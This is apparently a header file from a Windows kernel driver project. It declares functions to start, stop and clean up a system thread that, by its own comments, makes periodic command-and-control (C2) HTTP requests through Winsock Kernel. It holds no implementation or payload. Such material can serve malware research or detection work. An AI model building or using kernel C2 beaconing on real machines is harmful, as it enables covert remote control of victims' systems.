// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Creates a system thread to perform periodic C2 HTTP requests using a KEVENT-based wait loop.


	@return         STATUS_SUCCESS if the thread was created, or an appropriate NTSTATUS error code.
**/
NTSTATUS
TechniquesWinSockKernel_StartWSKThread();



/**
	@brief          Signals the periodic WSK thread to stop and waits for its termination.
**/
VOID
TechniquesWinSockKernel_StopWSKThread();



/**
	@brief          Cleans up WSK resources if previously initialized.
**/
VOID
TechniquesWinSockKernel_Unload();



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
